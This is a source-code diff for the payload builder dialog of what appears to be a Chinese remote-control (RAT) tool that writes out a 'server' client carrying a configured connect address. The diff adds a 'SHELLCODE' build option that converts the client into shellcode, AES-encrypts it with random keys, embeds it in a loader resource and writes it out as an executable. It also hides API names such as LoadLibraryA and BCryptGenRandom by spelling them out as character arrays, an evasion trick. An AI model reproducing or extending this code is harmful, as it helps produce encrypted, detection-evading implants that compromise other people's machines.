@@ -7,6 +7,9 @@
 #include "afxdialogex.h"
 #include <io.h>
 #include "InputDlg.h"
+#include <bcrypt.h>
+#include <wincrypt.h>
+#include <ntstatus.h>
 
 enum Index
 {
@@ -95,6 +98,42 @@ END_MESSAGE_MAP()
 
 std::string ReleaseUPX();
 void run_upx_async(HWND hwnd, const std::string& upx, const std::string& file, bool isCompress);
+
+bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer,
+	int ulOriginalLength, bool align = false);
+
+BOOL WriteBinaryToFile(const char* path, const char* data, ULONGLONG size);
+
+typedef struct SCInfo
+{
+	unsigned char aes_key[16];
+	unsigned char aes_iv[16];
+	unsigned char data[4 * 1024 * 1024];
+	int len;
+}SCInfo;
+
+#define GetAddr(mod, name) GetProcAddress(GetModuleHandleA(mod), name)
+
+bool MYLoadLibrary(const char* name) {
+	char kernel[] = { 'k','e','r','n','e','l','3','2',0 };
+	char load[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
+	typedef HMODULE(WINAPI* LoadLibraryF)(LPCSTR lpLibFileName);
+	if (!GetModuleHandleA(name)) {
+		LoadLibraryF LoadLibraryA = (LoadLibraryF)GetAddr(kernel, load);
+		return LoadLibraryA(name);
+	}
+	return true;
+}
+
+void generate_random_iv(unsigned char* iv, size_t len) {
+	typedef HMODULE(WINAPI* LoadLibraryF)(LPCSTR lpLibFileName);
+	typedef NTSTATUS(WINAPI* BCryptGenRandomF)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);
+	char crypt[] = { 'b','c','r','y','p','t',0 };
+	char name[] = { 'B','C','r','y','p','t','G','e','n','R','a','n','d','o','m',0 };
+	MYLoadLibrary(crypt);
+	BCryptGenRandomF BCryptGenRandom = (BCryptGenRandomF)GetAddr(crypt, name);
+	BCryptGenRandom(NULL, iv, len, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+}
 
 void CBuildDlg::OnBnClickedOk()
 {
@@ -230,8 +269,42 @@ void CBuildDlg::OnBnClickedOk()
 		{
 			run_upx_async(GetParent()->GetSafeHwnd(), upx, strSeverFile.GetString(), true);
 			MessageBox("正在UPX压缩，请关注信息提示。\r\n文件位于: " + strSeverFile + tip, "提示", MB_ICONINFORMATION);
-		}else 
-			MessageBox("生成成功! 文件位于:\r\n"+ strSeverFile + tip, "提示", MB_ICONINFORMATION);
+		} else {
+			if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC) {
+				DWORD dwSize = 0;
+				LPBYTE data = ReadResource(is64bit ? IDR_SCLOADER_X64 : IDR_SCLOADER_X86, dwSize);
+				if (data) {
+					int iOffset = MemoryFind((char*)data, (char*)g_ConnectAddress.Flag(), dwSize, g_ConnectAddress.FlagLen());
+					if (iOffset != -1) {
+						SCInfo* sc = (SCInfo*)(data + iOffset);
+						LPBYTE srcData = (LPBYTE)szBuffer;
+						int srcLen = dwFileSize;
+						if (MakeShellcode(srcData, srcLen, (LPBYTE)szBuffer, dwFileSize, true)) {
+							generate_random_iv(sc->aes_key, 16);
+							generate_random_iv(sc->aes_iv, 16);
+							std::string key, iv;
+							for (int i = 0; i < 16; ++i) key += std::to_string(sc->aes_key[i]) + " ";
+							for (int i = 0; i < 16; ++i) iv += std::to_string(sc->aes_iv[i]) + " ";
+							Mprintf("AES_KEY: %s, AES_IV: %s\n", key.c_str(), iv.c_str());
+
+							struct AES_ctx ctx;
+							AES_init_ctx_iv(&ctx, sc->aes_key, sc->aes_iv);
+							AES_CBC_encrypt_buffer(&ctx, srcData, srcLen);
+							if (srcLen <= 4 * 1024 * 1024) {
+								memcpy(sc->data, srcData, srcLen);
+								sc->len = srcLen;
+							}
+							SAFE_DELETE_ARRAY(srcData);
+							PathRenameExtension(strSeverFile.GetBuffer(MAX_PATH), _T(".exe"));
+							strSeverFile.ReleaseBuffer();
+							BOOL r = WriteBinaryToFile(strSeverFile.GetString(), (char*)data, dwSize);
+						}
+					}
+				}
+				SAFE_DELETE_ARRAY(data);
+			}
+			MessageBox("生成成功! 文件位于:\r\n" + strSeverFile + tip, "提示", MB_ICONINFORMATION);
+		}
 		SAFE_DELETE_ARRAY(szBuffer);
 		if (index == IndexTestRun_DLL) return;
 	}
@@ -295,6 +368,7 @@ BOOL CBuildDlg::OnInitDialog()
 
 	m_ComboCompress.InsertString(CLIENT_COMPRESS_NONE, "无");
 	m_ComboCompress.InsertString(CLIENT_COMPRESS_UPX, "UPX");
+	m_ComboCompress.InsertString(CLIENT_COMPRESS_SC, "SHELLCODE");
 	m_ComboCompress.SetCurSel(CLIENT_COMPRESS_NONE);
 
 	m_OtherItem.ShowWindow(SW_HIDE);
